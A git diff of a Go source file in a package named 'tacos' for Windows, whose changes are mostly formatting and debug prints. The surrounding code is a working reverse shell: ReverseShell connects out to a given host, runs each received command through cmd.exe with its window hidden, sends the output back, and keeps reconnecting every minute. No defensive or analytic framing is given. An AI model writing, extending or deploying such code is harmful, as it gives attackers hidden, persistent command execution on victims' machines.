@@ -1,19 +1,21 @@
 //go:build windows
 // +build windows
+
 package tacos
 
 import (
+	"bufio"
 	"fmt"
 	"net"
-	"time"
 	"os/exec"
-	"bufio"
 	"syscall"
+	"time"
 )
 
 //DetectDefaultShell: return the default shell
 func DetectDefaultShell() string {
 	shell := "cmd.exe"
+	fmt.Println("here")
 	return shell
 }
 
@@ -26,10 +28,8 @@ func ReverseShell(host string, shell string) {
 			c.Close()
 		}
 		time.Sleep(time.Minute)
-		ReverseShell(host,shell)
+		ReverseShell(host, shell)
 	}
-
-
 
 	r := bufio.NewReader(c)
 	for {
@@ -37,14 +37,13 @@ func ReverseShell(host string, shell string) {
 		if nil != err {
 			fmt.Println(err)
 			c.Close()
-			ReverseShell(host,shell)
+			ReverseShell(host, shell)
 			return
 		}
 		fmt.Println(order)
 		cmd := exec.Command(shell, "/C", order)
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		out, _ := cmd.CombinedOutput()
-		fmt.Println(out)
 		c.Write(out)
 	}
 }
